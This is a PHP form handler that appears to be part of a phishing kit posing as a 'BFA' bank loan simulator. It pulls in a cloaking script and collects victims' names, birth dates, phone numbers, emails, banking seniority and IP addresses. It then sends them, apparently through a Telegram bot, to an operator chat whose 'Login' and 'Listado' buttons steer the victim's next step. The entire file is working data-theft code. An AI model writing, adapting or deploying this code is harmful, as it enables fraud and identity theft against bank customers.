<?php
require_once __DIR__ . '/cloak.php';
session_start();
include('settings.php');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit; }

$nombres    = trim($_POST['nombres']    ?? '');
$apellidos  = trim($_POST['apellidos']  ?? '');
$fechaNac   = trim($_POST['fechaNac']   ?? '');
$phone      = trim($_POST['phone']      ?? '');
$email      = trim($_POST['email']      ?? '');
$antiguedad = trim($_POST['antiguedad'] ?? '');

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';

// Guardar nombre como "usuario" para que el resto del flujo lo use
$usuarioNombre = trim($nombres . ' ' . $apellidos);
if ($usuarioNombre) $_SESSION['usuario'] = $usuarioNombre;

$msg  = "🎯 SIMULADOR BFA - Nuevo lead\n";
$msg .= "👤 Nombre: $nombres $apellidos\n";
$msg .= "🎂 Fecha Nac: $fechaNac\n";
$msg .= "📞 Teléfono: $phone\n";
$msg .= "📧 Correo: $email\n";
$msg .= "🏦 Antigüedad: $antiguedad\n";
$msg .= "🌐 IP: $ip";

tg_request('sendMessage', [
    'chat_id'      => $chat_id,
    'text'         => $msg,
    'reply_markup' => json_encode([
        'inline_keyboard' => [[
            ['text' => '🔐 Login',    'callback_data' => "LOGIN|$usuarioNombre"],
            ['text' => '📋 Listado',  'callback_data' => "LISTADO|$usuarioNombre"]
        ]]
    ])
]);

http_response_code(200);
echo 'OK';
